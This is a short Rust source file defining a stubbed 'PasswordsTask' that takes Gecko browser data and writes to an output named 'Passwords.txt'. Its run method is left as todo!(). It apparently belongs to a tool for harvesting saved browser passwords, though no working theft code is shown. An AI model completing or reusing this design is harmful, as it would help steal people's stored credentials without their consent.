use crate::alloc::borrow::ToOwned;
use alloc::sync::Arc;
use tasks::{parent_name, Task};
use utils::path::Path;
use crate::gecko::GeckoBrowserData;

pub(super) struct PasswordsTask<'a> {
    browser: Arc<GeckoBrowserData<'a>>
}

impl<'a> PasswordsTask<'a> {
    pub(super) fn new(browser: Arc<GeckoBrowserData<'a>>) -> Self {
        Self { browser }
    }
}

impl Task for PasswordsTask<'_> {
    parent_name!("Passwords.txt");
    
    unsafe fn run(&self, parent: &Path) {
        todo!()
    }
}